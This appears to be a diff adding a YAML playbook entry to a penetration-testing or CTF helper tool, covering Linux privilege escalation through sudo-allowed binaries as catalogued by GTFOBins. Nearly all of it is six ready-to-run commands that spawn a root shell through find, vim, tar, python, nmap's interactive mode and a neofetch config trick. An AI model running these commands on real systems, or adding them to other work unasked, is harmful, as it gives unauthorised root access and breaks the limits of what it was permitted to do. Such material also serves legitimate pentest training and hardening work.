@@ -1,0 +1,49 @@
+chain_id: sudo_gtfobins
+title: "Linux privesc — sudo binary abuse via GTFOBins"
+severity: CRITICAL
+tags: [linux, privesc, sudo, gtfobins]
+
+trigger:
+  any_of:
+    - { kind: "sudo-binary" }
+
+description: |
+  At least one binary appears in `sudo -l` for the current user. For each
+  binary, look it up at https://gtfobins.github.io/ → 'Sudo' section. Below
+  are the most common one-shots from the apuntes PDF.
+
+steps:
+  - id: 1
+    title: "find"
+    command: sudo find . -exec /bin/sh \; -quit
+
+  - id: 2
+    title: "vim"
+    command: sudo vim -c ':!/bin/sh'
+
+  - id: 3
+    title: "tar"
+    command: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+  - id: 4
+    title: "python"
+    command: sudo python -c 'import os; os.system("/bin/sh")'
+
+  - id: 5
+    title: "nmap (legacy versions only)"
+    command: sudo nmap --interactive
+    notes: |
+      Inside nmap's interactive prompt: !sh
+
+  - id: 6
+    title: "neofetch (abuses --config to exec bash as root)"
+    command: |
+      TF=$(mktemp)
+      echo 'exec /bin/bash' > $TF
+      sudo neofetch --config $TF
+    notes: |
+      neofetch reads its config and executes its contents as Bash. With
+      sudo NOPASSWD on neofetch, this gives root.
+
+references:
+  - https://gtfobins.github.io/
